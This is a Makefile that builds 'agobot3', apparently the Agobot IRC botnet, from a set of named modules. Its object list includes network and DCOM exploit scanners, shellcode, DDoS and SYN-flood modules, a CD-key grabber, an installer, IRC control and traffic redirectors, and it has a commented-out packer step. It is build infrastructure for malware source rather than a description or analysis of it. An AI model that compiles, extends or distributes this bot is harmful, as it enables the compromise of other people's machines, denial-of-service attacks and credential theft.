CC = lib/dietlibc/lib/diet gcc -pipe
CXX = lib/dietlibc/lib/diet g++ -ansi -pipe
#DEBUG = -g -D_DEBUG
#BLA = -mpreferred-stack-boundary=2 -malign-functions=1 -malign-jumps=1 -malign-loops=1 -fomit-frame-pointer
#DIETCC = -Ilib/dietlibc/include -D__dietlibc__ -nostdlib
#DIETLD = -Llib/dietlibc/lib -static dietlibc.a -nostdlib -lgmon -lgcc
OPTIMIZE = -O1 -fomit-frame-pointer -fno-strength-reduce -ffast-math
MYCFLAGS = -DLINUX -Ilib/openssl/linux/include
MYLDFLAGS = -Bstatic -lssl -lcrypto -lpthread
FNAME = agobot3
OBJS = cmdline.o mainctrl.o crypter.o cstring.o consdbg.o utility.o random.o \
	mac.o bot.o commands.o cvar.o installer.o scanner.o nbscanner.o \
	dcomscanner.o shellcode.o irc.o locscanner.o ddos.o synflood.o wdscanner.o \
	rsalib.o ssllib.o config.o cdkeygrab.o redirect.o redir_tcp.o redir_gre.o \
	dcom2scanner.o redir_http.o redir_socks.o cthread.o
RSAOBJS = rsa/desc.o rsa/digit.o rsa/md2c.o rsa/md5c.o rsa/nn.o rsa/prime.o rsa/r_dh.o rsa/r_encode.o rsa/r_enhanc.o rsa/r_keygen.o rsa/r_random.o rsa/r_stdlib.o rsa/rsa.o
FTPOBJS = ftplib/ftplib.o

ifdef DEBUG
CFLAGS = $(MYCFLAGS) $(DEBUG) -DDBGCONSOLE
LDFLAGS = -Llib/openssl/linux/lib -Llib/dietlibc/lib $(MYLDFLAGS)
else
CFLAGS = $(MYCFLAGS)
LDFLAGS = -Llib/openssl/linux/lib $(MYLDFLAGS)
endif

ifdef OPTIMIZE
CFLAGS = $(MYCFLAGS) $(OPTIMIZE)
endif

all: $(OBJS) $(FTPOBJS) others link fin

cleanbin: clean $(OBJS) $(FTPOBJS) others link fin

others:
	$(MAKE) -C rsa
	$(MAKE) -C getmd5
	$(MAKE) -C crypt

link:
	$(CXX) -o $(FNAME) $(OBJS) $(RSAOBJS) $(FTPOBJS) $(LDFLAGS)

cmdline.o: cmdline.cpp
	$(CXX) $(CFLAGS) -c cmdline.cpp

mainctrl.o: mainctrl.cpp
	$(CXX) $(CFLAGS) -c mainctrl.cpp

crypter.o: crypter.cpp
	$(CXX) $(CFLAGS) -c crypter.cpp

cstring.o: cstring.cpp
	$(CXX) $(CFLAGS) -c cstring.cpp

consdbg.o: consdbg.cpp
	$(CXX) $(CFLAGS) -c consdbg.cpp

utility.o: utility.cpp
	$(CXX) $(CFLAGS) -c utility.cpp

random.o: random.cpp
	$(CXX) $(CFLAGS) -c random.cpp

mac.o: mac.cpp
	$(CXX) $(CFLAGS) -c mac.cpp

bot.o: bot.cpp
	$(CXX) $(CFLAGS) -c bot.cpp

commands.o: commands.cpp
	$(CXX) $(CFLAGS) -c commands.cpp

cvar.o: cvar.cpp
	$(CXX) $(CFLAGS) -c cvar.cpp

installer.o: installer.cpp
	$(CXX) $(CFLAGS) -c installer.cpp

scanner.o: scanner.cpp
	$(CXX) $(CFLAGS) -c scanner.cpp

nbscanner.o: nbscanner.cpp
	$(CXX) $(CFLAGS) -c nbscanner.cpp

dcomscanner.o: dcomscanner.cpp
	$(CXX) $(CFLAGS) -c dcomscanner.cpp

shellcode.o: shellcode.cpp
	$(CXX) $(CFLAGS) -c shellcode.cpp

irc.o: irc.cpp
	$(CXX) $(CFLAGS) -c irc.cpp

locscanner.o: locscanner.cpp
	$(CXX) $(CFLAGS) -c locscanner.cpp

ddos.o: ddos.cpp
	$(CXX) $(CFLAGS) -c ddos.cpp

synflood.o: synflood.cpp
	$(CXX) $(CFLAGS) -c synflood.cpp

wdscanner.o: wdscanner.cpp
	$(CXX) $(CFLAGS) -c wdscanner.cpp

rsalib.o: rsalib.cpp
	$(CXX) $(CFLAGS) -c rsalib.cpp

ssllib.o: ssllib.cpp
	$(CXX) $(CFLAGS) -c ssllib.cpp

config.o: config.cpp
	$(CXX) $(CFLAGS) -c config.cpp

cdkeygrab.o: cdkeygrab.cpp
	$(CXX) $(CFLAGS) -c cdkeygrab.cpp

redirect.o: redirect.cpp
	$(CXX) $(CFLAGS) -c redirect.cpp

redir_tcp.o: redir_tcp.cpp
	$(CXX) $(CFLAGS) -c redir_tcp.cpp

redir_gre.o: redir_gre.cpp
	$(CXX) $(CFLAGS) -c redir_gre.cpp

dcom2scanner.o: dcom2scanner.cpp
	$(CXX) $(CFLAGS) -c dcom2scanner.cpp

redir_http.o: redir_http.cpp
	$(CXX) $(CFLAGS) -c redir_http.cpp

redir_socks.o: redir_socks.cpp
	$(CXX) $(CFLAGS) -c redir_socks.cpp

cthread.o: cthread.cpp
	$(CXX) $(CFLAGS) -c cthread.cpp

ftplib/ftplib.o: ftplib/ftplib.c
	$(CC) -o ftplib/ftplib.o -c ftplib/ftplib.c

clean:
	@rm -f $(FNAME)
	$(MAKE) -C getmd5 clean
	$(MAKE) -C crypt clean
	$(MAKE) -C rsa clean
	@rm -f *.o
	@rm -f ftplib/linux/*.o

really_clean: clean
	@rm -f *.ilc
	@rm -f *.ild
	@rm -f *.ilf
	@rm -f *.ils
	@rm -f *.map
	@rm -f *.obj
	@rm -f *.tds
	@rm -f *.ncb
	@rm -f *.plg
	@rm -f *.exe
	@rm -f bin/linux/$(FNAME)
	@rm -f bin/linux/crypt
	@rm -f bin/linux/getmd5
	@rm -f bin/win32/$(FNAME).exe
	@rm -f bin/win32/$(FNAME).exe.bak
	@rm -f bin/win32/$(FNAME)d.exe
	@rm -f bin/win32/*.ilk
	@rm -f bin/win32/crypt.exe
	@rm -f bin/win32/cryptd.exe
	@rm -f bin/win32/getmd5.exe
	@rm -f bin/win32/getmd5d.exe
	@rm -rf Debug
	@rm -rf Release

fin:
	@mkdir -p bin/linux
	@cp $(FNAME) bin/linux
ifndef DEBUG
#	@bin/linux/packit.sh
endif
